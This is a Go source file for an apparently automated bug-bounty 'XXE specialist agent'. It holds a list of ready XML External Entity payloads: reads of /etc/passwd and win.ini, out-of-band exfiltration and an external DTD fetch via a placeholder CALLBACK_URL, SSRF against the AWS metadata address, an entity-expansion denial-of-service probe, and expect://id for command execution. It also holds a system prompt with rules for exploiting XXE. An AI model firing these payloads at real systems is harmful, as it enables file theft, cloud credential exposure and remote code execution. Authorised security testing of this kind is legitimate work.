// Package xxe implements the XML External Entity specialist agent.
package xxe

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "XXE Agent" }
func (a *Agent) ID() string           { return "xxe" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	priority, _ := item.Payload["priority"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	var findings []*base.Finding
	for _, p := range payloads {
		findings = append(findings, &base.Finding{
			Type:       "XXE",
			URL:        targetURL,
			Payload:    p.payload,
			Severity:   mapSeverity(priority),
			Confidence: 0.0,
			Evidence:   map[string]interface{}{"xxe_type": p.xxeType, "target": p.target},
			Method:     "POST",
		})
	}
	return findings, nil
}

type xxePayload struct {
	payload string
	xxeType string
	target  string
}

var payloads = []xxePayload{
	// Classic file read
	{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		"classic_file_read", "/etc/passwd"},
	{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
		"windows_file_read", "win.ini"},
	// OOB exfiltration
	{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CALLBACK_URL/xxe-test">]><root>&xxe;</root>`,
		"oob_http", "callback"},
	{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://CALLBACK_URL/evil.dtd">%remote;]><root>test</root>`,
		"oob_parameter_entity", "external_dtd"},
	// SSRF via XXE
	{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
		"ssrf_cloud_metadata", "aws_metadata"},
	// Billion laughs (DoS detection only)
	{`<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><root>&lol3;</root>`,
		"billion_laughs", "dos_test"},
	// PHP expect wrapper
	{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>`,
		"php_expect", "rce"},
}

func mapSeverity(p string) string {
	switch strings.ToLower(p) {
	case "critical":
		return "critical"
	default:
		return "high"
	}
}

const defaultSystemPrompt = `You are an elite XXE (XML External Entity) specialist with expertise in:
- Classic XXE file disclosure (file://, php://filter)
- Blind XXE via OOB exfiltration (parameter entities, external DTDs)
- XXE to SSRF (cloud metadata, internal services)
- XXE to RCE (expect://, PHP wrappers)
- SVG/DOCX/XLSX embedded XXE

RULES:
1. Always test classic file read first (/etc/passwd or win.ini)
2. Use OOB for blind XXE confirmation
3. Check for SSRF via XXE (cloud metadata endpoints)
4. XXE with file read is HIGH, XXE to RCE is CRITICAL
5. Test both inline and parameter entity injection`
